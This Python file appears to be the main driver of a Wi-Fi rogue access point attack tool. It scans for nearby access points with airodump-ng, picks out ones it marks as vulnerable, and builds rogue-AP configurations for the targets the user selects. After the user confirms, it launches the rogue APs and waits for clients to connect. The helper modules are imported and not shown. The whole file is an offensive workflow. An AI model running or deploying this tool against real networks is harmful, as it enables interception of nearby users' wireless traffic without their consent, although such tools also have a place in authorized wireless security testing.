from extract_vulnerable_aps import extract_vulnerable_aps, ap_selection
from airodump_utils import ap_discovery_airodump
from setup_rogue_ap import setup_rogue_ap, create_rogue_ap_config
import datetime
import os
import sys
import glob

def create_scan_directory():
    # Creates a working directory for the scan with the current date and time.
    now = datetime.datetime.now()
    folder_name = now.strftime("scan-%Y-%m-%d-%H-%M")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def new_attack_flow(interface, managed_interface):
  ## Create directory to store files.
  folder_name = create_scan_directory()

  ## Airodump for 1 min to discover APs.
  ap_discovery_airodump(interface, folder_name)

  ## Find all the captured traces files.
  pcap_files = glob.glob(os.path.join(folder_name, "discovery-*.pcap"))
  cap_files = glob.glob(os.path.join(folder_name, "discovery-*.cap"))
  all_files = pcap_files + cap_files
  
  if not all_files:
    print(f"No capture files found in {folder_name}. Please check if airodump-ng created any files.")
    sys.exit(1)
  
  print(f"Found {len(all_files)} capture files to analyze")
  
  ## Extract all vulnerable APs from the captures traces.
  all_vulnerable_aps = []
  for pcap_file in all_files:
    print(f"Parsing PCAP file: {pcap_file}")
    vulnerable_aps = extract_vulnerable_aps(pcap_file)
    all_vulnerable_aps.extend(vulnerable_aps)
  
  if not all_vulnerable_aps:
    print("No target APs found in any capture files. Exiting program.")
    sys.exit(1)
  
  ## Remove duplicates APs by BSSID
  unique_aps = []
  seen_bssids = set()
  for ap in all_vulnerable_aps:
    if ap['BSSID'] not in seen_bssids:
      unique_aps.append(ap)
      seen_bssids.add(ap['BSSID'])
  
  print(f"Processing {len(unique_aps)} unique target APs")
  
  ## Let user select which APs to attack
  selected_aps = ap_selection(unique_aps)
  if not selected_aps:
    sys.exit(0)
  
  new_interface_name = managed_interface

  ## Create Rogue-AP configuration files for the selected APs.
  created_files = []
  for ap in selected_aps:
    config_file = create_rogue_ap_config(folder_name, ap, new_interface_name)
    if config_file:
      created_files.append(config_file)
  
  if not created_files:
    print("No valid configuration files created. Exiting program.")
    sys.exit(1)
  
  ## Setup Rogue-APs and wait for client association/re-association.
  while True:
    consent = input("Would you like to start the attack? (y/n) ").strip().lower()
    if consent == 'y':
      for config_file in created_files:
        setup_rogue_ap(config_file)
      break
    elif consent == 'n':
      print("Attack aborted. Exiting program.")
      sys.exit(0)
    else:
      print("Invalid input. Please enter 'y' to start the attack or 'n' to abort.")
